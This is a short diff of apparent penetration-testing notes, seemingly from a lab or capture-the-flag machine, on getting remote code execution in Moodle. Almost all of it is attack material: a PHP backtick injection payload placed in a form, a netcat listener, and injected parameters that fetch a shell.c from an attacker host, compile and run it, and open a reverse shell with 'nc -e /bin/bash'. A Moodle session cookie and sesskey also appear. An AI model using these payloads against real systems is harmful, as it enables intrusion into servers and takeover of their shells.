@@ -27,4 +27,10 @@ Admin User
 Cookie: MoodleSession=2cfvjkmtj5vp54rsi47kfosi24
 edit=&sesskey=hHG6nWAZxf
 
-
+https://seclists.org/fulldisclosure/2018/Sep/28
+in form -> /*{a*/`$_GET[0]`;//{x}}
+our = nc -nvlp 20000
+&0=(date; ping -c 1 10.10.14.62)
+&0=(date; wget http://10.10.13.136:8000/shell.c;gcc shell.c -o shell;./shell)
+&0=(date; nc 10.10.13.136 20000 -e /bin/bash)
+whoami -> www-data 
